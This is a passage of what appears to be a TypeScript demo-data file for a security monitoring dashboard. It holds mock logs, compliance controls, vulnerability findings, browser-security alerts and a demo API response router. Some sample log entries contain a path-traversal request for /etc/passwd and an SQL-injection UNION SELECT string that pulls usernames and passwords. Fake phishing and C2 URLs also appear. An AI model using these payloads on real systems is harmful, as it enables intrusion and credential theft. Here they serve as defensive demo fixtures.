    { id: 3,  agent_id: 1, log_source: 'wineventlog', severity: 'high',     event_id: 7045, hostname: 'WIN-DC-01',     username: null,             source_ip: null,              log_message: 'EventID=7045 | Source=Service Control Manager | ServiceName=NetSvc32 | ImagePath=C:\\Windows\\Temp\\svc.exe', timestamp: hAgo(3) },
    { id: 4,  agent_id: 1, log_source: 'wineventlog', severity: 'high',     event_id: 4672, hostname: 'WIN-DC-01',     username: 'svc_backup',     source_ip: null,              log_message: 'EventID=4672 | Source=Microsoft-Windows-Security-Auditing | User=svc_backup', timestamp: hAgo(4) },
    { id: 5,  agent_id: 3, log_source: 'syslog',      severity: 'error',    event_id: null, hostname: 'LINUX-WEB-01',  username: 'root',           source_ip: '10.0.0.55',       log_message: 'Failed password for root from 10.0.0.55 port 54321 ssh2', timestamp: hAgo(4.5) },
    { id: 6,  agent_id: 3, log_source: 'syslog',      severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: 'deploy',         source_ip: null,              log_message: 'sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash', timestamp: hAgo(5) },
    { id: 7,  agent_id: 3, log_source: 'syslog',      severity: 'critical', event_id: null, hostname: 'LINUX-WEB-01',  username: 'root',           source_ip: null,              log_message: 'pam_unix(sshd:session): session opened for user root by (uid=0)', timestamp: hAgo(5.5) },
    { id: 8,  agent_id: 3, log_source: 'nginx',       severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '192.168.1.200',   log_message: 'GET /admin/../etc/passwd', timestamp: hAgo(6) },
    { id: 9,  agent_id: 3, log_source: 'apache',      severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '192.168.1.200',   log_message: "GET /search?q=1'+UNION+SELECT+null,username,password+FROM+users--", timestamp: hAgo(6.5) },
    { id: 10, agent_id: 3, log_source: 'nginx',       severity: 'info',     event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '45.33.32.156',    log_message: 'GET /robots.txt', timestamp: hAgo(7) },
    { id: 11, agent_id: 5, log_source: 'application', severity: 'critical', event_id: null, hostname: 'WIN-SERVER-02', username: null,             source_ip: null,              log_message: 'FATAL: Unhandled exception in payment module — NullReferenceException at PaymentService.Process()', timestamp: hAgo(8) },
    { id: 12, agent_id: 5, log_source: 'application', severity: 'error',    event_id: null, hostname: 'WIN-SERVER-02', username: null,             source_ip: null,              log_message: 'ERROR: DB connection failed — password=Sup3rS3cr3t! stored in config', timestamp: hAgo(9) },
  ],
}

// ── Scheduled Report mock data ────────────────────────────────────────────────

const DEMO_SCHEDULED_CONFIGS = [
  { report_type: 'daily_soc',          enabled: true,  recipients: 'soc@netcradus.com',           last_run_at: hAgo(18), updated_at: dAgo(7) },
  { report_type: 'monthly_compliance', enabled: true,  recipients: 'ciso@netcradus.com,audit@netcradus.com', last_run_at: dAgo(5), updated_at: dAgo(30) },
  { report_type: 'weekly_exec',        enabled: false, recipients: null,                            last_run_at: null,     updated_at: dAgo(14) },
]

const DEMO_REPORT_HISTORY = {
  total: 6,
  offset: 0,
  limit: 20,
  items: [
    { id: 1, report_type: 'daily_soc',          period_start: dAgo(1),  period_end: hAgo(0),  file_size: 41230, generated_at: hAgo(18), triggered_by: 'schedule', status: 'done',    error: null },
    { id: 2, report_type: 'weekly_exec',         period_start: dAgo(7),  period_end: dAgo(0),  file_size: 63820, generated_at: dAgo(1),  triggered_by: 'manual',   status: 'done',    error: null },
    { id: 3, report_type: 'monthly_compliance',  period_start: dAgo(30), period_end: dAgo(0),  file_size: 97105, generated_at: dAgo(5),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 4, report_type: 'daily_soc',           period_start: dAgo(2),  period_end: dAgo(1),  file_size: 38944, generated_at: dAgo(1),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 5, report_type: 'daily_soc',           period_start: dAgo(3),  period_end: dAgo(2),  file_size: 40112, generated_at: dAgo(2),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 6, report_type: 'daily_soc',           period_start: dAgo(4),  period_end: dAgo(3),  file_size: null,  generated_at: dAgo(3),  triggered_by: 'schedule', status: 'failed',  error: 'SMTP connection refused' },
  ],
}

// ── Compliance mock data ──────────────────────────────────────────────────────

const _ctrl = (
  id: number, ref: string, title: string, cat: string,
  pri: string, auto: boolean, status: string, ev: number,
) => ({ id, control_ref: ref, title, category: cat, priority: pri, xdr_auto: auto, status, evidence: ev })

const DEMO_COMPLIANCE_DASHBOARD = {
  overall_score:    82.0,
  total_controls:   80,
  missing_controls: 18,
  evidence_ready:   62,
  frameworks: [
    {
      id: 1, name: 'ISO 27001', version: '2022',
      description: 'Information security management systems', category: 'Security', color: '#3B82F6',
      score: 87.5, compliant: 12, missing: 2, total: 14,
      controls: [
        _ctrl(1,  'A.5.1',  'Information Security Policies',          'Governance',       'Critical', false, 'compliant',     3),
        _ctrl(2,  'A.6.1',  'Internal Organisation',                  'Governance',       'High',     false, 'compliant',     1),
        _ctrl(3,  'A.7.2',  'Information Security Awareness Training','People',           'High',     false, 'partial',       1),
        _ctrl(4,  'A.8.1',  'Asset Inventory & Classification',       'Asset Management', 'High',     true,  'compliant',     2),
        _ctrl(5,  'A.9.1',  'Access Control Policy',                  'Access Control',   'Critical', false, 'compliant',     2),
        _ctrl(6,  'A.9.4',  'System & Application Access Control',   'Access Control',   'High',     true,  'compliant',     2),
        _ctrl(7,  'A.10.1', 'Cryptographic Controls',                 'Cryptography',     'High',     false, 'non_compliant', 0),
        _ctrl(8,  'A.12.1', 'Operational Security Procedures',        'Operations',       'High',     true,  'compliant',     2),
        _ctrl(9,  'A.12.4', 'Logging and Monitoring',                 'Operations',       'Critical', true,  'compliant',     3),
        _ctrl(10, 'A.12.6', 'Technical Vulnerability Management',     'Operations',       'High',     true,  'compliant',     2),
        _ctrl(11, 'A.13.1', 'Network Security Management',            'Communications',   'High',     true,  'compliant',     1),
        _ctrl(12, 'A.16.1', 'Incident Response Procedures',           'Incident Mgmt',    'Critical', true,  'compliant',     3),
        _ctrl(13, 'A.18.1', 'Compliance with Legal Requirements',     'Compliance',       'High',     false, 'non_compliant', 0),
        _ctrl(14, 'A.5.23', 'Information Security for Cloud Services','Cloud',            'High',     false, 'compliant',     1),
      ],
    },
    {
      id: 2, name: 'SOC 2', version: 'Type II',
      description: 'Service organization control criteria', category: 'Audit', color: '#8B5CF6',
      score: 84.6, compliant: 11, missing: 2, total: 13,
      controls: [
        _ctrl(15, 'CC1.1', 'Control Environment — Governance',         'Control Environment', 'Critical', false, 'compliant',     2),
        _ctrl(16, 'CC2.1', 'Communication of Information',             'Communication',       'High',     false, 'compliant',     1),
        _ctrl(17, 'CC3.1', 'Risk Assessment',                          'Risk Assessment',     'Critical', false, 'partial',       1),
        _ctrl(18, 'CC5.1', 'Control Activities — Policies',            'Control Activities',  'High',     false, 'compliant',     2),
        _ctrl(19, 'CC6.1', 'Logical & Physical Access Controls',       'Access Control',      'Critical', true,  'compliant',     3),
        _ctrl(20, 'CC6.6', 'Transmission Security',                    'Access Control',      'High',     true,  'compliant',     2),
        _ctrl(21, 'CC7.1', 'System Monitoring',                        'Monitoring',          'High',     true,  'compliant',     2),
        _ctrl(22, 'CC7.2', 'Threat & Vulnerability Management',        'Monitoring',          'Critical', true,  'compliant',     3),
        _ctrl(23, 'CC8.1', 'Change Management',                        'Change Mgmt',         'High',     false, 'non_compliant', 0),
        _ctrl(24, 'CC9.1', 'Risk Mitigation',                          'Risk Mgmt',           'High',     false, 'compliant',     1),
        _ctrl(25, 'A1.1',  'Availability — Capacity Planning',         'Availability',        'Medium',   false, 'compliant',     1),
        _ctrl(26, 'PI1.1', 'Processing Integrity',                     'Integrity',           'High',     false, 'non_compliant', 0),
        _ctrl(27, 'C1.1',  'Confidentiality of Information',           'Confidentiality',     'Critical', false, 'compliant',     2),
      ],
    },
    {
      id: 3, name: 'PCI DSS', version: 'v4.0',
      description: 'Payment card industry data security standard', category: 'Finance', color: '#F59E0B',
      score: 76.9, compliant: 10, missing: 4, total: 14,
      controls: [
        _ctrl(28, 'Req 1',  'Install & Maintain Firewalls',            'Network Security',    'Critical', true,  'compliant',     2),
        _ctrl(29, 'Req 2',  'No Default Passwords or Security Params', 'Configuration',       'Critical', true,  'compliant',     2),
        _ctrl(30, 'Req 3',  'Protect Stored Cardholder Data',          'Data Protection',     'Critical', false, 'non_compliant', 0),
        _ctrl(31, 'Req 4',  'Encrypt Transmission of Cardholder Data', 'Encryption',          'Critical', false, 'non_compliant', 0),
        _ctrl(32, 'Req 5',  'Anti-Malware Software',                   'Anti-Malware',        'High',     true,  'compliant',     2),
        _ctrl(33, 'Req 6',  'Secure Systems and Software',             'Patch Management',    'High',     true,  'compliant',     2),
        _ctrl(34, 'Req 7',  'Restrict Access by Business Need',        'Access Control',      'High',     false, 'compliant',     1),
        _ctrl(35, 'Req 8',  'Identify & Authenticate Users',           'Authentication',      'Critical', false, 'compliant',     2),
        _ctrl(36, 'Req 9',  'Restrict Physical Access',                'Physical Security',   'Medium',   false, 'non_compliant', 0),
        _ctrl(37, 'Req 10', 'Log & Monitor All Access',                'Logging',             'High',     true,  'compliant',     3),
        _ctrl(38, 'Req 11', 'Test Security Systems Regularly',         'Testing',             'High',     true,  'compliant',     2),
        _ctrl(39, 'Req 12', 'Maintain Information Security Policy',    'Policy',              'High',     false, 'compliant',     1),
        _ctrl(40, '11.3.1', 'External Penetration Testing',            'Testing',             'High',     false, 'non_compliant', 0),
        _ctrl(41, '12.10', 'Incident Response Plan',                   'Incident Response',   'Critical', true,  'compliant',     2),
      ],
    },
    {
      id: 4, name: 'GDPR', version: '2018',
      description: 'General Data Protection Regulation', category: 'Privacy', color: '#10B981',
      score: 83.3, compliant: 10, missing: 2, total: 12,
      controls: [
        _ctrl(42, 'Art.5',   'Principles of Processing',               'Data Principles',     'Critical', false, 'compliant',     2),
        _ctrl(43, 'Art.6',   'Lawfulness of Processing',               'Legal Basis',         'Critical', false, 'compliant',     1),
        _ctrl(44, 'Art.12',  'Transparent Communication',              'Transparency',        'High',     false, 'compliant',     1),
        _ctrl(45, 'Art.17',  'Right to Erasure',                       'Data Subject Rights', 'High',     false, 'partial',       1),
        _ctrl(46, 'Art.25',  'Privacy by Design',                      'Privacy',             'High',     false, 'compliant',     1),
        _ctrl(47, 'Art.28',  'Processor Contracts (DPA)',              'Contracts',           'High',     false, 'compliant',     2),
        _ctrl(48, 'Art.30',  'Records of Processing Activities (ROPA)','Documentation',      'High',     false, 'non_compliant', 0),
        _ctrl(49, 'Art.32',  'Security of Processing',                 'Technical Controls',  'Critical', true,  'compliant',     3),
        _ctrl(50, 'Art.33',  'Breach Notification to Authority',       'Incident Response',   'Critical', false, 'non_compliant', 0),
        _ctrl(51, 'Art.35',  'Data Protection Impact Assessment',      'Risk',                'High',     false, 'compliant',     1),
        _ctrl(52, 'Art.37',  'Data Protection Officer',                'Governance',          'Medium',   false, 'compliant',     1),
        _ctrl(53, 'Art.44',  'International Data Transfers',           'Data Transfers',      'High',     false, 'compliant',     1),
      ],
    },
    {
      id: 5, name: "DPDP Act", version: '2023',
      description: "India's Digital Personal Data Protection Act", category: 'Privacy', color: '#F97316',
      score: 76.9, compliant: 10, missing: 3, total: 13,
      controls: [
        _ctrl(54, 'S.4',   'Grounds for Processing',                  'Legal Basis',         'Critical', false, 'compliant',     1),
        _ctrl(55, 'S.6',   'Consent Management',                      'Consent',             'Critical', false, 'compliant',     2),
        _ctrl(56, 'S.8',   'Obligations of Data Fiduciary',           'Obligations',         'Critical', false, 'compliant',     1),
        _ctrl(57, 'S.9',   'Processing of Data of Children',          'Children Data',       'Critical', false, 'non_compliant', 0),
        _ctrl(58, 'S.10',  'Significant Data Fiduciary Obligations',  'Compliance',          'High',     false, 'non_compliant', 0),
        _ctrl(59, 'S.11',  'Rights of Data Principal',                'Data Rights',         'High',     false, 'compliant',     1),
        _ctrl(60, 'S.12',  'Right to Correction and Erasure',        'Data Rights',         'High',     false, 'compliant',     1),
        _ctrl(61, 'S.13',  'Right to Grievance Redressal',           'Grievance',           'Medium',   false, 'compliant',     1),
        _ctrl(62, 'S.17',  'Exemptions',                              'Legal',               'Medium',   false, 'compliant',     1),
        _ctrl(63, 'S.20',  'Data Localisation Requirements',          'Data Residency',      'High',     false, 'non_compliant', 0),
        _ctrl(64, 'S.22',  'Security Safeguards',                    'Technical Controls',  'Critical', true,  'compliant',     3),
        _ctrl(65, 'S.24',  'Breach Reporting to DPB',                'Incident Response',   'Critical', false, 'compliant',     2),
        _ctrl(66, 'S.27',  'Data Protection Board Compliance',       'Regulatory',          'High',     false, 'compliant',     1),
      ],
    },
    {
      id: 6, name: 'HIPAA', version: '2024',
      description: 'Health Insurance Portability and Accountability Act', category: 'Healthcare', color: '#06B6D4',
      score: 83.3, compliant: 10, missing: 2, total: 12,
      controls: [
        _ctrl(67, '§164.308(a)(1)', 'Risk Analysis & Management',      'Administrative',     'Critical', true,  'compliant',     2),
        _ctrl(68, '§164.308(a)(3)', 'Workforce Security',              'Administrative',     'High',     false, 'compliant',     1),
        _ctrl(69, '§164.308(a)(5)', 'Security Awareness Training',     'Administrative',     'High',     false, 'partial',       1),
        _ctrl(70, '§164.308(a)(6)', 'Security Incident Procedures',    'Administrative',     'Critical', true,  'compliant',     3),
        _ctrl(71, '§164.310(a)(1)', 'Facility Access Controls',        'Physical',           'High',     false, 'compliant',     1),
        _ctrl(72, '§164.312(a)(1)', 'Access Control — Unique IDs',    'Technical',          'Critical', true,  'compliant',     2),
        _ctrl(73, '§164.312(a)(2)', 'Emergency Access Procedures',     'Technical',          'High',     false, 'compliant',     1),
        _ctrl(74, '§164.312(b)',    'Audit Controls',                  'Technical',          'High',     true,  'compliant',     3),
        _ctrl(75, '§164.312(c)(1)', 'Integrity Controls',             'Technical',          'High',     true,  'compliant',     2),
        _ctrl(76, '§164.312(e)(1)', 'Transmission Security',           'Technical',          'Critical', false, 'non_compliant', 0),
        _ctrl(77, '§164.314(a)(1)', 'Business Associate Contracts',    'Contracts',          'High',     false, 'non_compliant', 0),
        _ctrl(78, '§164.316(b)',    'Documentation Requirements',      'Documentation',      'Medium',   false, 'compliant',     1),
      ],
    },
  ],
}

// ── Vulnerability mock data ───────────────────────────────────────────────────

const DEMO_VULN_DASHBOARD = {
  total_open:    47,
  critical:       5,
  high:          12,
  medium:        18,
  low:            9,
  info:           3,
  by_check_type: { cve: 15, port: 8, patch: 4, rdp: 3, smb: 2, password: 5, software: 7, other: 3 },
  asset_summary: [
    { agent_id: 1, hostname: 'WIN-DC-01',     ip_address: '10.0.0.1',       Critical: 3, High: 5, Medium: 4, Low: 2, Info: 1, risk_score: 85 },
    { agent_id: 2, hostname: 'WIN-WORKST-01', ip_address: '192.168.1.101',  Critical: 1, High: 4, Medium: 6, Low: 3, Info: 2, risk_score: 60 },
    { agent_id: 3, hostname: 'LINUX-WEB-01',  ip_address: '192.168.1.50',   Critical: 1, High: 3, Medium: 5, Low: 2, Info: 0, risk_score: 51 },
    { agent_id: 5, hostname: 'WIN-SERVER-02', ip_address: '10.0.0.5',       Critical: 0, High: 0, Medium: 3, Low: 2, Info: 0, risk_score: 8  },
  ],
  recent_scans: [
    { id: 3, agent_id: 1, hostname: 'WIN-DC-01',     critical_count: 3, high_count: 5, medium_count: 4, low_count: 2, total_findings: 15, started_at: hAgo(2), completed_at: hAgo(1.98) },
    { id: 2, agent_id: 2, hostname: 'WIN-WORKST-01', critical_count: 1, high_count: 4, medium_count: 6, low_count: 3, total_findings: 16, started_at: hAgo(4), completed_at: hAgo(3.97) },
    { id: 1, agent_id: 3, hostname: 'LINUX-WEB-01',  critical_count: 1, high_count: 3, medium_count: 5, low_count: 2, total_findings: 11, started_at: dAgo(1), completed_at: dAgo(0.999) },
  ],
}

const DEMO_VULN_FINDINGS = [
  { id: 1,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'cve',      severity: 'Critical', title: 'CVE-2021-44228: Log4Shell in log4j 2.14.1',                   description: 'JNDI remote code execution via Log4j logger.',                          remediation: 'Upgrade Log4j to 2.17.1+',                                      cve_id: 'CVE-2021-44228', cvss_score: 10.0, affected_component: 'log4j 2.14.1',     package_name: 'log4j',  installed_version: '2.14.1', fixed_version: '2.17.1', status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 2,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'cve',      severity: 'Critical', title: 'CVE-2022-3786: OpenSSL 3.0.5 buffer overflow',                  description: 'X.509 email address variable length buffer overflow.',               remediation: 'Upgrade OpenSSL to 3.0.7+',                                     cve_id: 'CVE-2022-3786', cvss_score: 9.8,  affected_component: 'openssl 3.0.5',    package_name: 'openssl',installed_version: '3.0.5',  fixed_version: '3.0.7',  status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 3,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'smb',      severity: 'Critical', title: 'SMBv1 Protocol Enabled',                                        description: 'SMBv1 is exploitable via EternalBlue (CVE-2017-0144), used in WannaCry.', remediation: 'Set-SmbServerConfiguration -EnableSMB1Protocol $false', cve_id: 'CVE-2017-0144', cvss_score: 9.8,  affected_component: 'SMBv1',           package_name: null,    installed_version: null,     fixed_version: null,     status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 4,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'patch',    severity: 'Critical', title: 'Windows Not Patched for 210 Days',                              description: 'Last Windows update was applied 210 days ago. Unpatched systems are vulnerable.', remediation: 'Run Windows Update immediately and enable automatic updates.', cve_id: null, cvss_score: null, affected_component: 'Windows Update', package_name: null, installed_version: null, fixed_version: null, status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 5,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'rdp',      severity: 'High',     title: 'RDP Enabled Without Network Level Authentication',              description: 'RDP is reachable but NLA is not enforced, increasing brute-force risk.',         remediation: 'Enable NLA in System Properties → Remote settings.',            cve_id: null, cvss_score: null, affected_component: 'RDP (Port 3389)', package_name: null, installed_version: null, fixed_version: null, status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 6,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'port',     severity: 'High',     title: 'Dangerous port open: 23/Telnet',                               description: 'Telnet transmits all data including credentials in plaintext.',                  remediation: 'Disable Telnet; use SSH instead.',                              cve_id: null, cvss_score: null, affected_component: 'Port 23 (Telnet)', package_name: null, installed_version: null, fixed_version: null, status: 'open',          first_seen: hAgo(2),  last_seen: hAgo(2) },
  { id: 7,  agent_id: 1, hostname: 'WIN-DC-01',     check_type: 'port',     severity: 'Critical', title: 'Dangerous port open: 6379/Redis',                              description: 'Redis exposed — no authentication by default.',                                  remediation: 'Enable Redis AUTH and bind to localhost.',                      cve_id: null, cvss_score: null, affected_component: 'Port 6379 (Redis)', package_name: null, installed_version: null, fixed_version: null, status: 'acknowledged',  first_seen: hAgo(4),  last_seen: hAgo(4) },
  { id: 8,  agent_id: 2, hostname: 'WIN-WORKST-01', check_type: 'cve',      severity: 'Critical', title: 'CVE-2023-38408: OpenSSH 8.0 Remote Code Execution',            description: 'OpenSSH ssh-agent allows remote code execution via malicious PKCS11 lib.',      remediation: 'Upgrade OpenSSH to 9.1+',                                       cve_id: 'CVE-2023-38408', cvss_score: 9.8, affected_component: 'openssh 8.0', package_name: 'openssh', installed_version: '8.0', fixed_version: '9.1', status: 'open', first_seen: hAgo(4), last_seen: hAgo(4) },
  { id: 9,  agent_id: 2, hostname: 'WIN-WORKST-01', check_type: 'password', severity: 'High',     title: 'Weak Password Policy: Minimum Length Too Short',               description: 'Minimum password length is set to 6. NIST recommends at least 12 characters.',   remediation: 'Set minimum length to 12+ in Group Policy.',                   cve_id: null, cvss_score: null, affected_component: 'Password Policy', package_name: null, installed_version: null, fixed_version: null, status: 'open',          first_seen: hAgo(4),  last_seen: hAgo(4) },
  { id: 10, agent_id: 2, hostname: 'WIN-WORKST-01', check_type: 'password', severity: 'High',     title: 'Guest Account Enabled',                                        description: 'The Guest account is active, allowing limited unauthenticated access.',             remediation: 'Run: net user Guest /active:no',                                cve_id: null, cvss_score: null, affected_component: 'Local Users', package_name: null, installed_version: null, fixed_version: null, status: 'resolved',      first_seen: dAgo(3),  last_seen: dAgo(3) },
  { id: 11, agent_id: 3, hostname: 'LINUX-WEB-01',  check_type: 'patch',    severity: 'High',     title: '7 Security Packages Need Updating',                            description: '7 security-related package updates are available but not installed.',              remediation: 'Run: apt-get update && apt-get upgrade -y',                     cve_id: null, cvss_score: null, affected_component: 'apt packages',   package_name: null, installed_version: null, fixed_version: null, status: 'open',          first_seen: dAgo(1),  last_seen: dAgo(1) },
  { id: 12, agent_id: 3, hostname: 'LINUX-WEB-01',  check_type: 'cve',      severity: 'High',     title: 'CVE-2023-44487: HTTP/2 Rapid Reset (NGINX 1.22.0)',            description: 'HTTP/2 Rapid Reset attack can cause DoS on NGINX instances.',                    remediation: 'Upgrade NGINX to 1.25.3+',                                      cve_id: 'CVE-2023-44487', cvss_score: 7.5, affected_component: 'nginx 1.22.0', package_name: 'nginx', installed_version: '1.22.0', fixed_version: '1.25.3', status: 'open', first_seen: dAgo(1), last_seen: dAgo(1) },
]

// ── Router ────────────────────────────────────────────────────────────────────

// ── Browser Security mock data ────────────────────────────────────────────────

const _bsNow = new Date().toISOString()
const _bsHrs = (h: number) => new Date(Date.now() - h * 3600_000).toISOString()

const DEMO_BROWSER_DASHBOARD = {
  total_open: 23,
  by_type: {
    extension:          7,
    password_leak:      4,
    ai_usage:           5,
    malicious_download: 3,
    malicious_site:     4,
  },
  by_severity: { Critical: 5, High: 10, Medium: 6, Low: 2, Info: 0 },
  by_browser:  { chrome: 14, edge: 6, firefox: 3 },
  recent_events: [],
}

const DEMO_BROWSER_EVENTS = [
  {
    id: 1, agent_id: 1,
    event_type: 'extension', severity: 'Critical', browser: 'chrome',
    title: 'Dangerous browser extension: Stylish',
    description: 'Known malicious extension ID; Critical permissions: nativeMessaging, debugger',
    url: null, extension_id: 'fjnbnpbmkenffdnngjfgmeleoegfcffe', extension_name: 'Stylish',
    file_name: null, file_path: null, sha256: null, username: 'jdoe',
    status: 'open', detected_at: _bsHrs(1),
  },
  {
    id: 2, agent_id: 1,
    event_type: 'extension', severity: 'High', browser: 'chrome',
    title: 'Dangerous browser extension: HTTP Request Modifier',
    description: 'Sideloaded extension (not from official store); Sensitive permissions: cookies, history',
    url: null, extension_id: 'bfbmjmiodbnnpllbbbfblcplfjjepjdn', extension_name: 'HTTP Request Modifier',
    file_name: null, file_path: null, sha256: null, username: 'jdoe',
    status: 'open', detected_at: _bsHrs(2),
  },
  {
    id: 3, agent_id: 2,
    event_type: 'extension', severity: 'High', browser: 'edge',
    title: 'Dangerous browser extension: Tab Manager Pro',
    description: 'Sensitive permissions: management, cookies, history',
    url: null, extension_id: 'aabbccddeeff00112233', extension_name: 'Tab Manager Pro',
    file_name: null, file_path: null, sha256: null, username: 'asmith',
    status: 'open', detected_at: _bsHrs(4),
  },
  {
    id: 4, agent_id: 1,
    event_type: 'password_leak', severity: 'High', browser: 'chrome',
    title: 'Browser-saved passwords detected (142 entries)',
    description: 'Chrome has 142 saved passwords stored in Login Data. These are encrypted with Windows DPAPI but are accessible to any process running as the same user and are targeted by infostealer malware.',
    url: null, extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'jdoe',
    status: 'open', detected_at: _bsHrs(3),
  },
  {
    id: 5, agent_id: 2,
    event_type: 'password_leak', severity: 'High', browser: 'firefox',
    title: 'Firefox saved passwords detected (67 entries)',
    description: 'Firefox has 67 saved passwords in logins.json. Without a Primary Password set, these can be decrypted by any process with filesystem access.',
    url: null, extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'asmith',
    status: 'acknowledged', detected_at: _bsHrs(6),
  },
  {
    id: 6, agent_id: 3,
    event_type: 'ai_usage', severity: 'Medium', browser: 'chrome',
    title: 'AI platform usage detected: chat.openai.com',
    description: 'User accessed chat.openai.com in the last 7 days via chrome. Sensitive corporate data may have been shared with an external AI service. Review acceptable use policy.',
    url: 'https://chat.openai.com', extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'bwilson',
    status: 'open', detected_at: _bsHrs(5),
  },
  {
    id: 7, agent_id: 1,
    event_type: 'ai_usage', severity: 'Medium', browser: 'chrome, edge',
    title: 'AI platform usage detected: claude.ai',
    description: 'User accessed claude.ai in the last 7 days via chrome, edge. Sensitive corporate data may have been shared with an external AI service. Review acceptable use policy.',
    url: 'https://claude.ai', extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'jdoe',
    status: 'open', detected_at: _bsHrs(8),
  },
  {
    id: 8, agent_id: 2,
    event_type: 'ai_usage', severity: 'Medium', browser: 'firefox',
    title: 'AI platform usage detected: perplexity.ai',
    description: 'User accessed perplexity.ai in the last 7 days via firefox. Sensitive corporate data may have been shared with an external AI service.',
    url: 'https://perplexity.ai', extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'asmith',
    status: 'resolved', detected_at: _bsHrs(12),
  },
  {
    id: 9, agent_id: 3,
    event_type: 'malicious_download', severity: 'Critical', browser: null,
    title: 'Suspicious download: update_installer.exe',
    description: "Executable or script file 'update_installer.exe' was downloaded recently. Verify this file is legitimate before executing.",
    url: null, extension_id: null, extension_name: null,
    file_name: 'update_installer.exe', file_path: 'C:\\Users\\bwilson\\Downloads\\update_installer.exe',
    sha256: 'a3f4e270f2ddaaa214e904f3970558cad0967aadeea2165dba1ae6bbcd4a943b',
    username: 'bwilson', status: 'open', detected_at: _bsHrs(2),
  },
  {
    id: 10, agent_id: 1,
    event_type: 'malicious_download', severity: 'High', browser: null,
    title: 'Suspicious download: macro_enabled.ps1',
    description: "Script file 'macro_enabled.ps1' was downloaded recently. PowerShell scripts are commonly used in malware delivery chains.",
    url: null, extension_id: null, extension_name: null,
    file_name: 'macro_enabled.ps1', file_path: 'C:\\Users\\jdoe\\Downloads\\macro_enabled.ps1',
    sha256: 'b7e3a12c4d9f021e8a6b5c3d7e9f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6',
    username: 'jdoe', status: 'open', detected_at: _bsHrs(7),
  },
  {
    id: 11, agent_id: 2,
    event_type: 'malicious_site', severity: 'High', browser: 'chrome',
    title: 'Suspected malicious site visit: http://login-secure-bankofamerica-.tk/verify',
    description: "Browser history contains a visit to a URL matching the suspicious pattern 'login-secure-'. This may indicate phishing or drive-by download activity.",
    url: 'http://login-secure-bankofamerica-.tk/verify',
    extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'asmith',
    status: 'open', detected_at: _bsHrs(10),
  },
  {
    id: 12, agent_id: 3,
    event_type: 'malicious_site', severity: 'High', browser: 'edge',
    title: 'Suspected malicious site visit: https://ngrok-free.app/c2endpoint',
    description: "Browser history contains a visit to a URL matching the suspicious pattern 'ngrok-free.app'. Ngrok tunnels in browsing history may indicate C2 communication or data exfiltration.",
    url: 'https://ngrok-free.app/c2endpoint',
    extension_id: null, extension_name: null,
    file_name: null, file_path: null, sha256: null, username: 'bwilson',
    status: 'open', detected_at: _bsHrs(14),
  },
]

export function resolveDemoResponse<T>(path: string, method = 'GET'): T {
  const base = path.split('?')[0].replace(/\/+$/, '')

  // ── Mutations ─────────────────────────────────────────────────────────────
  if (method !== 'GET') {
    if (base.includes('/toggle')) return { enabled: true, id: 0 } as unknown as T
    if (base.includes('/support/tickets')) return { id: 1, status: 'Open', message: 'Your ticket has been submitted. Our team will review it shortly.' } as unknown as T

    // POST /incidents/{id}/notes → return a demo InvestigationNote
    const notePost = base.match(/^\/incidents\/(\d+)\/notes$/)
    if (notePost) {
      return {
        id: Date.now(), user_name: 'Demo Admin', note_type: 'note',
        content: '(demo) Note saved.', created_at: new Date().toISOString(),
      } as unknown as T
    }

    // POST /incidents/{id}/evidence → return a demo EvidenceItem
    const evPost = base.match(/^\/incidents\/(\d+)\/evidence$/)
    if (evPost) {
      return {
        id: Date.now(), added_by_name: 'Demo Admin', title: '(demo) Evidence',
        evidence_type: 'note', content: null, created_at: new Date().toISOString(),
      } as unknown as T
    }

    // PUT /incidents/{id}/resolve → return the matched incident as Resolved
    const resolveMatch = base.match(/^\/incidents\/(\d+)\/resolve$/)
    if (resolveMatch) {
      const id = parseInt(resolveMatch[1])
      const inc = DEMO_INCIDENTS.find((i) => i.id === id) ?? DEMO_INCIDENTS[0]
      return { ...inc, status: 'Resolved', resolved_at: new Date().toISOString() } as unknown as T
    }

    // PUT /incidents/{id}/status
    const statusMatch = base.match(/^\/incidents\/(\d+)\/status$/)
    if (statusMatch) {
      const id = parseInt(statusMatch[1])
      const inc = DEMO_INCIDENTS.find((i) => i.id === id) ?? DEMO_INCIDENTS[0]
      return { ...inc } as unknown as T
    }

    // PUT /reports/scheduled/{report_type}
    const schedPutMatch = base.match(/^\/reports\/scheduled\/(.+)$/)
    if (schedPutMatch) {
      return { report_type: schedPutMatch[1], enabled: true, recipients: null, updated_at: new Date().toISOString() } as unknown as T
    }

    // POST /reports/trigger/{report_type}
    const triggerMatch = base.match(/^\/reports\/trigger\/(.+)$/)
    if (triggerMatch) {
      return { status: 'accepted', task_id: 'demo-task-report', report_type: triggerMatch[1], tenant_id: 9999 } as unknown as T
    }

    // POST /reports/generate
    if (base === '/reports/generate') {
      return { status: 'accepted', task_id: 'demo-task-report-cache', tenant_id: 9999 } as unknown as T
    }

    // POST /iocs/sync
    // PATCH /compliance/controls/{id}/assessment
